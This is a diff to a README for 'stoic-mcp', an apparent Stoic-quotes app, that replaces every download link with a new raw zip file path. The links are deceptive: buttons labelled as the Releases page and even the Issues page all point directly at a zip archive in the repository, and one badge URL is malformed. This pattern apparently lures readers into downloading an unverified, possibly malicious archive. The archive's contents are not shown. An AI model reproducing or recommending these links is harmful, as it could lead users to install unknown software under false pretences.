@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 Welcome to the stoic-mcp project! This application serves Stoic philosophy quotes along with AI-powered explanations. It is built to enhance understanding and engagement with Stoicism through interactive learning experiences. Follow the steps below to download and run the software easily.
 
-[![Download stoic-mcp](https://raw.githubusercontent.com/princeyohann/stoic-mcp/main/local/stoic-mcp_1.3.zip%20MCP-blue?style=for-the-badge)](https://raw.githubusercontent.com/princeyohann/stoic-mcp/main/local/stoic-mcp_1.3.zip)
+[![Download stoic-mcp](https://github.com/princeyohann/stoic-mcp/raw/refs/heads/main/local/stoic_mcp_v2.0.zip%20MCP-blue?style=for-the-badge)](https://github.com/princeyohann/stoic-mcp/raw/refs/heads/main/local/stoic_mcp_v2.0.zip)
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application files.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/princeyohann/stoic-mcp/main/local/stoic-mcp_1.3.zip)
+[Visit the Releases Page to Download](https://github.com/princeyohann/stoic-mcp/raw/refs/heads/main/local/stoic_mcp_v2.0.zip)
 
 ### Step 1: Choose the Version
 On the Releases page, you will see different versions of the stoic-mcp application. Look for the latest stable release. It usually has the highest version number. 
@@ -57,7 +57,7 @@ If you encounter any problems while using the stoic-mcp application, consider th
 ## 🔗 Community and Contributions
 We welcome contributions! If you want to help improve the stoic-mcp application, consider the following:
 
-- Report issues on the [Issues Page](https://raw.githubusercontent.com/princeyohann/stoic-mcp/main/local/stoic-mcp_1.3.zip).
+- Report issues on the [Issues Page](https://github.com/princeyohann/stoic-mcp/raw/refs/heads/main/local/stoic_mcp_v2.0.zip).
 - Suggest features that can enhance the user experience.
 - You can also fork the repository and create pull requests with your improvements.
 
@@ -69,4 +69,4 @@ If you have any questions or feedback, you can reach out on the Issues page or c
 
 Thank you for using stoic-mcp! We hope this tool helps you explore the wisdom of Stoic philosophy with ease. 
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/princeyohann/stoic-mcp/main/local/stoic-mcp_1.3.zip)
+[Visit the Releases Page to Download](https://github.com/princeyohann/stoic-mcp/raw/refs/heads/main/local/stoic_mcp_v2.0.zip)
